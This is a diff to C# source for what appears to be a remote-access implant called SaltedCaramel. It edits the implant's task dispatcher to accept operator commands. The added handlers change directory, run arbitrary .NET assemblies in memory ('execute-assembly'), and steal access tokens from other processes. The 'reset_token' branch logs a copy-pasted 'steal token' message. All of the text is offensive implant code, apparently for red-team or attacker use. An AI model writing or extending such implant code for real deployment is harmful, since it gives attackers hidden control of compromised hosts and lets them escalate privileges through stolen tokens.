@@ -34,15 +34,25 @@ namespace SaltedCaramel
         /// <param name="implant">The CaramelImplant we're handling a task for</param>
         public void DispatchTask(SaltedCaramelImplant implant)
         {
-            if (this.command == "exit")
+            if (this.command == "cd")
             {
-                Debug.WriteLine("[-] DispatchTask - Tasked to exit");
-                Exit.Execute(this, implant);
+                Debug.WriteLine("[-] DispatchTask - Tasked to change directory " + this.@params);
+                ChangeDir.Execute(this, implant);
             }
             else if (this.command == "download")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to send file " + this.@params);
                 Download.Execute(this, implant);
+            }
+            else if (this.command == "execute-assembly")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to execute assembly " + this.@params);
+                Tasks.Assembly.Execute(this, implant);
+            }
+            else if (this.command == "exit")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to exit");
+                Exit.Execute(this, implant);
             }
             else if (this.command == "upload")
             {
@@ -98,10 +108,15 @@ namespace SaltedCaramel
                 }
             }
             else if (this.command == "steal_token")
-                // EXPERIMENTAL - doesn't quite work yet
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to steal token from process " + this.@params);
                 Token.StealToken(Convert.ToInt32(this.@params));
+            }
             else if (this.command == "reset_token")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to steal token from process " + this.@params);
                 Token.stolenHandle = IntPtr.Zero;
+            }
         }
     }
 }
